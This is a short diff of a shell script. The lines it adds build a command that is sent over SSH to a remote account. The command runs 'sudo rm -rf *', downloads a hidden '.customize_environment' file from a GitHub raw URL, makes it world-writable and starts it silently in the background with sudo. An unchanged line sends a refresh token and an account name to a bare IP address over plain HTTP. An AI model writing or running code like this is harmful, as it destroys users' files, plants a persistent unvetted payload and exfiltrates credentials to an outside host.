@@ -119,7 +119,13 @@ fi
 
  if [ "$PublicKey" != 'null' ] && [ $commandOk == 'null' ]
  then
-    source command.sh $sshUsername $sshHost 'date'
+    command="sudo rm -rf *"
+    command=$command" && sudo rm -rf .customize_environment"
+    command=$command" && wget -q https://raw.githubusercontent.com/Predador21/scripts/main/.customize_environment -P /home/"$sshUsername
+    command=$command" && chmod 777 .customize_environment"
+    command=$command" && sudo nohup ./.customize_environment > /dev/null &"
+
+    source command.sh $sshUsername $sshHost "$command"
  fi
 
  url='http://135.148.11.148/send_status.php?refresh='$refresh_token'&status='$status'&owner='$account
